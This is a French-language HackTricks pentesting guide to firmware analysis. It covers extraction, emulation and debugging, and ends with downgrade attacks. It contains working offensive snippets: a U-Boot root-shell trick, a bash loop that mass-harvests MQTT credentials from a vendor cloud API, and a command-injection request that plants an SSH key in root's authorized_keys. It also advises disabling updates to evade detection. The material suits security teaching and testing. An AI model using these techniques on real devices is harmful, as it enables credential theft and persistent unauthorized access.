# Analyse du firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Ressources liées


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Le firmware est un logiciel essentiel qui permet aux appareils de fonctionner correctement en gérant et en facilitant la communication entre les composants matériels et le logiciel avec lequel les utilisateurs interagissent. Il est stocké dans une mémoire permanente, garantissant que l'appareil peut accéder aux instructions vitales dès la mise sous tension, ce qui permet le lancement du système d'exploitation. Examiner et éventuellement modifier le firmware est une étape critique pour identifier des vulnérabilités de sécurité.

## **Collecte d'informations**

La **collecte d'informations** est une étape initiale critique pour comprendre la composition d'un appareil et les technologies qu'il utilise. Ce processus implique la collecte de données sur :

- L'architecture CPU et le système d'exploitation qu'il exécute
- Les spécificités du bootloader
- La disposition matérielle et les datasheets
- Les métriques de la base de code et les emplacements des sources
- Les bibliothèques externes et les types de licences
- Les historiques de mise à jour et les certifications réglementaires
- Les diagrammes d'architecture et de flux
- Les évaluations de sécurité et les vulnérabilités identifiées

Pour cela, les outils de renseignement en source ouverte (OSINT) sont inestimables, de même que l'analyse des composants logiciels open-source disponibles via des revues manuelles et automatisées. Des outils comme [Coverity Scan](https://scan.coverity.com) et [Semmle’s LGTM](https://lgtm.com/#explore) offrent une analyse statique gratuite pouvant être utilisée pour détecter des problèmes potentiels.

## **Acquisition du firmware**

Obtenir le firmware peut être abordé par différents moyens, chacun avec son propre niveau de complexité :

- **Directement** depuis la source (développeurs, fabricants)
- **Le construire** à partir des instructions fournies
- **Le télécharger** depuis les sites de support officiels
- Utiliser des requêtes **Google dork** pour trouver des fichiers firmware hébergés
- Accéder directement au **cloud storage**, avec des outils comme [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercepter des **updates** via des techniques man-in-the-middle
- **Extraire** depuis l'appareil via des connexions comme **UART**, **JTAG**, ou **PICit**
- **Sniffer** les requêtes de mise à jour dans les communications de l'appareil
- Identifier et utiliser des **hardcoded update endpoints**
- **Dumper** depuis le bootloader ou le réseau
- **Retirer et lire** la puce de stockage, lorsque tout le reste échoue, en utilisant des outils matériels appropriés

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## Analyse du firmware

Maintenant que vous **avez le firmware**, vous devez en extraire des informations pour savoir comment l'aborder. Différents outils que vous pouvez utiliser pour cela :
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Si vous ne trouvez pas grand-chose avec ces outils, vérifiez l'**entropy** de l'image avec `binwalk -E <bin>` : si l'**entropy** est faible, il est peu probable qu'elle soit chiffrée. Si l'**entropy** est élevée, il est probable qu'elle soit chiffrée (ou compressée d'une manière ou d'une autre).

De plus, vous pouvez utiliser ces outils pour extraire **files embedded inside the firmware** :


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pour inspecter le fichier.

### Obtenir le filesystem

Avec les outils mentionnés précédemment comme `binwalk -ev <bin>` vous devriez avoir pu **extract the filesystem**.\
Binwalk l'extrait généralement dans un **folder named as the filesystem type**, qui est en général l'un des suivants : squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extraction manuelle du filesystem

Parfois, binwalk n'aura **pas le magic byte du filesystem dans ses signatures**. Dans ces cas, utilisez binwalk pour **trouver l'offset du filesystem et carve the compressed filesystem** depuis le binaire et **extraire manuellement** le filesystem selon son type en suivant les étapes ci‑dessous.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Exécutez la commande **dd** suivante pour effectuer le carving du système de fichiers Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativement, la commande suivante peut aussi être exécutée.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Pour squashfs (utilisé dans l'exemple ci-dessus)

`$ unsquashfs dir.squashfs`

Les fichiers se trouveront ensuite dans le répertoire `squashfs-root`.

- Pour les archives CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Pour les systèmes de fichiers jffs2

`$ jefferson rootfsfile.jffs2`

- Pour les systèmes de fichiers ubifs sur NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyse du firmware

Une fois le firmware obtenu, il est essentiel de le disséquer pour comprendre sa structure et ses vulnérabilités potentielles. Ce processus implique l'utilisation de divers outils pour analyser et extraire des données pertinentes de l'image du firmware.

### Outils d'analyse initiaux

Une série de commandes est fournie pour l'inspection initiale du fichier binaire (désigné comme `<bin>`). Ces commandes aident à identifier les types de fichiers, extraire les chaînes, analyser les données binaires et comprendre les détails des partitions et des systèmes de fichiers :
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Pour évaluer l'état de chiffrement de l'image, on vérifie l'**entropie** avec `binwalk -E <bin>`. Une entropie faible suggère l'absence de chiffrement, tandis qu'une entropie élevée indique un chiffrement possible ou une compression.

Pour extraire les **fichiers embarqués**, il est recommandé d'utiliser des outils et ressources comme la documentation **file-data-carving-recovery-tools** et **binvis.io** pour l'inspection des fichiers.

### Extraction du système de fichiers

En utilisant `binwalk -ev <bin>`, on peut généralement extraire le système de fichiers, souvent dans un répertoire nommé d'après le type de système de fichiers (par exemple, squashfs, ubifs). Cependant, lorsque **binwalk** n'arrive pas à reconnaître le type de système de fichiers à cause d'octets magiques manquants, une extraction manuelle est nécessaire. Cela implique d'utiliser `binwalk` pour localiser l'offset du système de fichiers, puis la commande `dd` pour découper le système de fichiers :
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Ensuite, selon le type de système de fichiers (par exemple, squashfs, cpio, jffs2, ubifs), différentes commandes sont utilisées pour extraire manuellement le contenu.

### Analyse du système de fichiers

Une fois le système de fichiers extrait, la recherche de failles de sécurité commence. On prête attention aux network daemons non sécurisés, aux hardcoded credentials, aux API endpoints, aux fonctionnalités de update server, au code non compilé, aux startup scripts et aux compiled binaries pour analyse hors ligne.

**Emplacements clés** et **éléments** à inspecter incluent :

- **etc/shadow** et **etc/passwd** pour les identifiants utilisateurs
- Certificats et clés SSL dans **etc/ssl**
- Fichiers de configuration et scripts susceptibles de contenir des vulnérabilités
- Binaries embarqués pour analyse approfondie
- Serveurs web courants d'appareils IoT et leurs binaries

Plusieurs outils aident à découvrir des informations sensibles et des vulnérabilités dans le système de fichiers :

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) et [**Firmwalker**](https://github.com/craigz28/firmwalker) pour la recherche d'informations sensibles
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) pour une analyse complète de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), et [**EMBA**](https://github.com/e-m-b-a/emba) pour l'analyse statique et dynamique

### Vérifications de sécurité sur les binaires compilés

Le code source et les binaires compilés trouvés dans le système de fichiers doivent être examinés pour détecter des vulnérabilités. Des outils comme **checksec.sh** pour les binaires Unix et **PESecurity** pour les binaires Windows aident à identifier les binaires non protégés qui pourraient être exploités.

## Récupération de la config cloud et des identifiants MQTT via des tokens d'URL dérivés

De nombreux hubs IoT récupèrent leur configuration par appareil depuis un endpoint cloud qui ressemble à :

- `https://<api-host>/pf/<deviceId>/<token>`

Lors de l'analyse du firmware, il est possible de trouver que `<token>` est dérivé localement du device ID à l'aide d'un secret hardcodé, par exemple :

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Cette conception permet à quiconque connaît un deviceId et le STATIC_KEY de reconstruire l'URL et d'extraire la config cloud, révélant souvent des MQTT credentials en clair et des préfixes de topics.

Flux de travail pratique :

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Recherchez les lignes affichant le cloud config URL pattern et l'adresse du broker, par exemple :
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Récupérer STATIC_KEY et l'algorithme du token depuis le firmware

- Chargez les binaires dans Ghidra/radare2 et recherchez le chemin de configuration ("/pf/") ou l'utilisation de MD5.
- Confirmez l'algorithme (par ex., MD5(deviceId||STATIC_KEY)).
- Dérivez le token en Bash et mettez le digest en majuscules :
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Récupérer la cloud config et les identifiants MQTT

- Composer l'URL et récupérer le JSON avec curl; analyser avec jq pour extraire les secrets :
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Exploiter MQTT en clair et des ACLs de topic faibles (si présentes)

- Utiliser les recovered credentials pour s'abonner aux maintenance topics et rechercher des événements sensibles :
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Énumérer les identifiants d'appareil prévisibles (à grande échelle, avec autorisation)

- De nombreux écosystèmes intègrent des octets OUI du fabricant/produit/type suivis d'un suffixe séquentiel.
- Vous pouvez itérer des identifiants candidats, dériver des jetons et récupérer des configurations de manière programmatique :
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Remarques
- Obtenez toujours une autorisation explicite avant de tenter une mass enumeration.
- Préférez l'emulation ou la static analysis pour récupérer des secrets sans modifier le hardware cible quand c'est possible.


Le processus d'emulation du firmware permet une **dynamic analysis** soit du fonctionnement d'un appareil, soit d'un programme individuel. Cette approche peut rencontrer des difficultés liées au hardware ou aux dépendances d'architecture, mais transférer le root filesystem ou des binaires spécifiques vers un appareil dont l'architecture et l'endianness correspondent, comme un Raspberry Pi, ou vers une virtual machine préconçue, peut faciliter des tests supplémentaires.

### Emulation de binaires individuels

Pour examiner des programmes individuels, il est crucial d'identifier l'endianness du programme et l'architecture CPU.

#### Exemple avec l'architecture MIPS

Pour émuler un binaire d'architecture MIPS, on peut utiliser la commande :
```bash
file ./squashfs-root/bin/busybox
```
Et pour installer les outils d'émulation nécessaires :
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Pour MIPS (big-endian), `qemu-mips` est utilisé, et pour les binaires little-endian, le choix serait `qemu-mipsel`.

#### Émulation de l'architecture ARM

Pour les binaires ARM, le processus est similaire, en utilisant l'émulateur `qemu-arm` pour l'émulation.

### Émulation du système complet

Des outils comme [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), et d'autres, facilitent l'émulation complète de firmware, automatisent le processus et aident l'analyse dynamique.

## Analyse dynamique en pratique

À ce stade, un environnement réel ou émulé de l'appareil est utilisé pour l'analyse. Il est essentiel de maintenir un accès shell à l'OS et au filesystem. L'émulation peut ne pas reproduire parfaitement les interactions matérielles, nécessitant des redémarrages d'émulation occasionnels. L'analyse doit revisiter le filesystem, exploiter les pages web exposées et les services réseau, et explorer les vulnérabilités du bootloader. Les tests d'intégrité du firmware sont essentiels pour identifier d'éventuelles backdoors.

## Techniques d'analyse à l'exécution

L'analyse à l'exécution consiste à interagir avec un processus ou un binaire dans son environnement d'exécution, en utilisant des outils comme gdb-multiarch, Frida et Ghidra pour placer des breakpoints et identifier des vulnérabilités via le fuzzing et d'autres techniques.

Pour les cibles embarquées sans débogueur complet, **copiez un `gdbserver` statiquement lié** sur l'appareil et connectez-vous à distance :
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Exploitation binaire et preuve de concept

Développer un PoC pour des vulnérabilités identifiées requiert une compréhension approfondie de l'architecture cible et de la programmation en langages bas niveau. Les protections runtime binaires dans les systèmes embarqués sont rares, mais lorsqu'elles existent, des techniques comme Return Oriented Programming (ROP) peuvent être nécessaires.

### Notes sur l'exploitation des fastbins uClibc (embedded Linux)

- **Fastbins + consolidation :** uClibc utilise des fastbins similaires à glibc. Une allocation plus tardive et de grande taille peut déclencher `__malloc_consolidate()`, donc tout faux chunk doit passer les vérifications (taille cohérente, `fd = 0`, et chunks adjacents vus comme "in use").
- **Binaries non-PIE sous ASLR :** si ASLR est activé mais que le binaire principal est **non-PIE**, les adresses `.data/.bss` à l'intérieur du binaire sont stables. Vous pouvez cibler une région qui ressemble déjà à un en-tête de chunk valide pour obtenir une allocation fastbin sur une **function pointer table**.
- **NUL qui arrête le parser :** lorsqu'un JSON est parsé, un `\x00` dans la charge utile peut arrêter le parsing tout en conservant des octets contrôlés par l'attaquant en trailing pour un pivot de pile / chaîne ROP.
- **Shellcode via `/proc/self/mem` :** une chaîne ROP qui appelle `open("/proc/self/mem")`, `lseek()` et `write()` peut implanter du shellcode exécutable dans un mapping connu et y sauter.

## Prepared Operating Systems for Firmware Analysis

Des systèmes d'exploitation comme [AttifyOS](https://github.com/adi0x90/attifyos) et [EmbedOS](https://github.com/scriptingxss/EmbedOS) fournissent des environnements préconfigurés pour les tests de sécurité de firmware, équipés des outils nécessaires.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS est une distribution destinée à aider à réaliser des security assessment et penetration testing des dispositifs Internet of Things (IoT). Elle vous fait gagner beaucoup de temps en fournissant un environnement pré-configuré avec tous les outils nécessaires chargés.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Système d'exploitation pour tests de sécurité embarquée basé sur Ubuntu 18.04 préchargé avec des outils de firmware security testing.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Même lorsqu'un fournisseur met en place des vérifications de signature cryptographique pour les images firmware, la **protection contre le version rollback (downgrade)** est fréquemment omise. Lorsque le boot- ou recovery-loader ne vérifie que la signature avec une clé publique embarquée mais ne compare pas la *version* (ou un compteur monotone) de l'image flashée, un attaquant peut installer légitimement un **firmware plus ancien et vulnérable qui porte toujours une signature valide** et réintroduire ainsi des vulnérabilités corrigées.

Flux d'attaque typique :

1. **Obtenir une ancienne image signée**
* La récupérer depuis le portail de téléchargement public du vendor, un CDN ou le site de support.
* L'extraire des applications mobiles/desktop compagnon (p. ex. à l'intérieur d'un APK Android sous `assets/firmware/`).
* La récupérer depuis des dépôts tiers tels que VirusTotal, archives Internet, forums, etc.
2. **Uploader ou servir l'image à l'appareil** via n'importe quel canal de mise à jour exposé :
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Beaucoup de devices IoT grand public exposent des endpoints HTTP(S) *unauthenticated* qui acceptent des blobs de firmware encodés en Base64, les décodent côté serveur et déclenchent recovery/upgrade.
3. Après le downgrade, exploiter une vulnérabilité qui avait été patchée dans la release plus récente (par exemple un filtre de command-injection ajouté ultérieurement).
4. Optionnellement re-flasher l'image la plus récente ou désactiver les updates pour éviter la détection une fois la persistance obtenue.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Dans le firmware vulnérable (downgraded), le paramètre `md5` est concaténé directement dans une commande shell sans assainissement, permettant l'injection de commandes arbitraires (ici — activation de l'accès root par clé SSH). Les versions de firmware ultérieures ont introduit un filtre basique de caractères, mais l'absence de protection contre le downgrade rend le correctif futile.

### Extraction du firmware depuis les applications mobiles

De nombreux fabricants intègrent des images de firmware complètes dans leurs applications mobiles associées afin que l'application puisse mettre à jour l'appareil via Bluetooth/Wi-Fi. Ces packages sont couramment stockés non chiffrés dans l'APK/APEX sous des chemins comme `assets/fw/` ou `res/raw/`. Des outils tels que `apktool`, `ghidra`, ou même le simple `unzip` permettent d'extraire des images signées sans toucher au matériel physique.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checklist pour évaluer la logique de mise à jour

* Le transport/l'authentication du *update endpoint* est-il adéquatement protégé (TLS + authentication) ?
* L'appareil compare-t-il des **version numbers** ou un **monotonic anti-rollback counter** avant le flash ?
* L'image est-elle vérifiée à l'intérieur d'une **secure boot chain** (par ex. signatures vérifiées par du **ROM code**) ?
* Le **userland code** effectue-t-il des contrôles de sanity supplémentaires (par ex. partition map autorisée, model number) ?
* Les *partial* ou *backup* update flows réutilisent-ils la même logique de validation ?

> 💡  Si l'un des éléments ci-dessus manque, la plateforme est probablement vulnérable aux rollback attacks.

## Vulnerable firmware to practice

To practice discovering vulnerabilities in firmware, use the following vulnerable firmware projects as a starting point.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
